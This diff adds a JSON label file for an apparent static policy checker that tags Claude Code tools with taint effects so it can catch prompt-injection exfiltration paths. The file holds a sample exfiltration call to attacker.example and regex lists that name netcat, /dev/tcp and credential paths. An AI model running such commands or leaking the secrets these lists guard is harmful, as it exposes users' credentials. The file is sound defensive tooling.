@@ -1,0 +1,72 @@
+{
+  "//": "The labeler — the human-authored map from a Claude Code tool (or permission rule) to abstract effect classes. This file is DATA, not code, so it is inspectable and overridable (--labels <file>). It is a NAMED TRUST OBLIGATION, not a proved thing: polycheck proves the POLICY over these labels; it does not prove the labels are right. A mislabeled tool is a hole the proof cannot see. Effects are the taint universe {untrusted, sensitive, egress}; add your own and reference them in regions.",
+  "version": "0.1.0",
+  "effects": {
+    "untrusted": "the session now holds content of external / attacker-influenceable provenance (prompt-injection carrier)",
+    "sensitive": "the session has read secret material — credentials, keys, tokens, private data",
+    "egress": "the session holds an outbound channel capable of carrying bytes off the machine"
+  },
+  "tools": {
+    "WebFetch": { "effects": ["untrusted", "egress"], "note": "BOTH ingest and egress. It pulls attacker-controlled content INTO context AND can carry data OUT in the URL/query — WebFetch('https://attacker.example/?k=' + secret) is the classic, in-the-wild exfiltration channel (Check Point: token exfiltration via Claude Code). Labeling it ingest-only was a real bug: it left an ungated egress path whenever only Bash(curl) was gated." },
+    "WebSearch": { "effects": ["untrusted"], "note": "returns external content into the context. A search QUERY is technically a low-bandwidth egress channel (searching for a secret string sends it to the provider); left as ingest-only here to avoid over-flagging, but noted rather than hidden." },
+    "Read": { "effects": [], "sensitiveWhenPathMatches": true, "note": "benign unless it can reach a secret path — see sensitivePaths; an unrestricted Read is treated as sensitive-capable" },
+    "Edit": { "effects": [], "note": "local mutation; out of scope for the exfiltration regions (a tampering region would cover it — v1 does not model integrity)" },
+    "Write": { "effects": [], "note": "as Edit" },
+    "NotebookEdit": { "effects": [], "note": "as Edit" },
+    "Glob": { "effects": [], "note": "path enumeration; discloses names, not contents" },
+    "Grep": { "effects": [], "sensitiveWhenPathMatches": true, "note": "can read secret file contents if pointed at them; treated like Read for the sensitive class" },
+    "Bash": { "classify": "bash", "worstCaseWhenUnrestricted": ["untrusted", "sensitive", "egress"], "note": "effect depends on the command string; see bashPatterns. An unrestricted Bash (no specifier, '*', or ':*') is gated on DECLARED WORST-CASE — it alone can complete the trifecta." },
+    "Task": { "effects": [], "delegates": true, "note": "spawns a subagent — a delegation edge. v1 does NOT propagate taint across the spawn (a known gap in v1). Reported loudly, not silently cleared." }
+  },
+  "mcp": {
+    "untrustedByDefault": true,
+    "unknownServerEffects": ["untrusted", "egress"],
+    "unknownToolEffects": ["untrusted"],
+    "egressToolPatterns": [
+      "send", "post", "create", "write", "update", "upload", "push", "publish",
+      "delete", "remove", "execute", "run", "email", "mail", "message", "comment",
+      "merge", "deploy", "invoke", "request", "http", "fetch", "notify", "dispatch", "webhook"
+    ],
+    "note": "An MCP tool's real effects are unknowable at static time (the server is not run). Two honest defaults. (1) Every MCP tool returns remote, attacker-influenceable bytes into context, so it is 'untrusted'. (2) MCP tools usually act on EXTERNAL systems (Slack, GitHub, Notion, Linear…), so a tool whose name matches an egress verb (send/post/create/write/upload/…) is ALSO 'egress' — a first-class exfiltration channel exactly like WebFetch. A whole server whose tool list we cannot see (mcp__server__*) is worst-case untrusted+egress. This is a heuristic and a named trust obligation: override per tool in 'tools' by full name (mcp__server__tool), and every assumption is surfaced in the report."
+  },
+  "bashPatterns": {
+    "egress": [
+      "\\bcurl\\b", "\\bwget\\b", "\\bnc\\b", "\\bncat\\b", "\\bnetcat\\b", "\\btelnet\\b",
+      "\\bscp\\b", "\\bsftp\\b", "\\brsync\\b", "\\bssh\\b", "\\bftp\\b",
+      "git\\s+push", "npm\\s+publish", "yarn\\s+publish", "\\bmail\\b", "\\bsendmail\\b",
+      ">\\s*/dev/tcp", "\\bhttpie\\b", "\\bhttp\\b\\s", "\\baws\\s+s3\\s+cp\\b"
+    ],
+    "sensitive": [
+      "\\bcurl\\b", "\\bwget\\b", "\\bscp\\b", "\\brsync\\b", "\\bssh\\b", "\\bsftp\\b",
+      "\\bftp\\b", "\\bnc\\b", "\\bncat\\b", "\\bnetcat\\b", "\\bmail\\b", "\\bsendmail\\b",
+      "\\.aws/credentials", "~/\\.aws", "\\.ssh/", "\\bid_rsa\\b", "\\bid_ed25519\\b",
+      "\\.env\\b", "\\bprintenv\\b", "(^|\\s)env(\\s|$)", "/etc/passwd", "/etc/shadow",
+      "\\.pem\\b", "\\.key\\b", "\\.netrc\\b", "\\.git-credentials\\b",
+      "\\bcredentials?\\b", "\\bsecrets?\\b", "\\btoken\\b", "\\bpassword\\b",
+      "aws\\s+configure\\s+get", "gcloud\\s+auth", "security\\s+find-generic-password",
+      "kubectl\\s+get\\s+secret", "vault\\s+read", "op\\s+read", "op\\s+item\\s+get"
+    ],
+    "untrusted": [
+      "\\bcurl\\b", "\\bwget\\b", "git\\s+clone", "pip\\s+install", "npm\\s+install",
+      "npx\\b", "\\bgh\\b\\s+.*(view|read)", "\\bhttpie\\b"
+    ]
+  },
+  "//bashArbitraryExecution": "Commands whose prefix is NOT a security boundary: they run caller-chosen code, so bounding them by a Bash(prefix:*) rule proves nothing. `npm run test` executes whatever package.json says (and prefix-matches `npm run test:whatever`); `make`, `python`, `bash -c`, `xargs`, `find -exec`, `git -c core.pager=…` all execute arbitrary code. Any match here is declared WORST-CASE (untrusted ∧ sensitive ∧ egress) — the single largest source of false-PROOF if omitted.",
+  "bashArbitraryExecution": [
+    "\\bnpm\\b", "\\bnpx\\b", "\\byarn\\b", "\\bpnpm\\b", "\\bbun\\b", "\\bdeno\\b",
+    "\\bnode\\b", "\\bpython[0-9.]*\\b", "\\bruby\\b", "\\bperl\\b", "\\bphp\\b",
+    "\\b(sh|bash|zsh|dash|fish)\\b", "\\beval\\b", "\\bexec\\b", "\\bsource\\b",
+    "\\bmake\\b", "\\bjust\\b", "\\btask\\b", "\\bcargo\\b", "\\bgo\\s+run\\b",
+    "\\bmvn\\b", "\\bgradle\\b", "\\bdocker\\b", "\\bgh\\s+api\\b", "\\bxargs\\b",
+    "-exec\\b", "\\bsudo\\b", "\\benv\\s+\\w+=", "\\bawk\\b",
+    "\\bgit\\s+-c\\b", "\\bgit\\s+config\\b"
+  ],
+  "defaultUngated": ["Read", "Glob", "Grep", "LS", "NotebookRead"],
+  "//defaultUngated": "Built-in read-only tools Claude Code runs WITHOUT a prompt even with an empty policy. They are ungated allow-edges by default (version-dependent; override with --labels). This is why an empty policy is not automatically safe: Read alone supplies the 'sensitive' effect. Surfaced as an assumption in every report.",
+  "sensitivePaths": [
+    "**/.env", "**/.env.*", "**/credentials", "**/credentials.*", "**/*.pem", "**/*.key",
+    "**/id_rsa", "**/id_rsa.*", "**/id_ed25519", "**/.ssh/**", "**/.aws/**", "**/.netrc",
+    "**/.git-credentials", "**/secrets/**", "**/secret*", "**/*secret*", "**/*token*",
+    "**/.npmrc", "**/.pypirc", "**/.kube/config", "**/service-account*.json"
+  ]
+}
